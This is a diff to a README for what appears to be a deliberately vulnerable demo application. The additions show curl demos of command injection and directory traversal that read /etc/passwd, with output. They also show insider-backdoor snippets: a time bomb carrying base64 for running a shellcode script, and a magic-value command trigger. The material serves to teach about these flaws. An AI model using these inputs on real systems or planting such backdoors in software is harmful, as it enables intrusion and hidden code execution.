@@ -9,19 +9,55 @@
 
 ### SQL Injection:
 
+### Remote code execution:
+- Command-Line Demo:
+    ```sh
+    $ curl -X GET -d "name=cat /etc/passwd" http://localhost:5005/ExecCmdSecure
+   
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nolog
+    ```
+
 ### Directory traversal:
+
+- Command-Line Demo:
+    ```sh
+    $ curl -X GET -d "name=../../etc/passwd" http://localhost:5005/dirTraversal
+   
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nolog
+    ```
+http://localhost:5005/dirTraversal?name=${name}`
 
 ### Hard Coded credentials:
 
 ### Sensitive data leak:
 
 ### Insider attack:
+1.  Time Bomb pattern
+    ```java
+    // RECIPE: Time Bomb pattern
+    String command = "c2ggL3RtcC9zaGVsbGNvZGUuc2g=";
+    ticking(command);
+    ```
+    
+2. Magic Value leading to command injection
+    ```java
+    if (tracefn == "C4A938B6FE01E") {
+        runtTimeExec(cmd);
+    }
+    ```
+
 
 ### Business logic flaw
-- Explain: It is a **Deserialization Vulnerability**. 
-Basically, server code deserialize a input controlled by the attack.
-When deserialize an object, its "ReadObject" method was invoked implicitly by the deserializer,
-which futher invoke the malicious payload (Gadget)
 - [Code Snippet](https://gitlab.com/irobert0126/aspdotnet_csharp_vuln_demo/tree/master/SqlInjection/Controllers/OrderController.cs):
     ```java
     [HttpPost("AddNewOrder")]
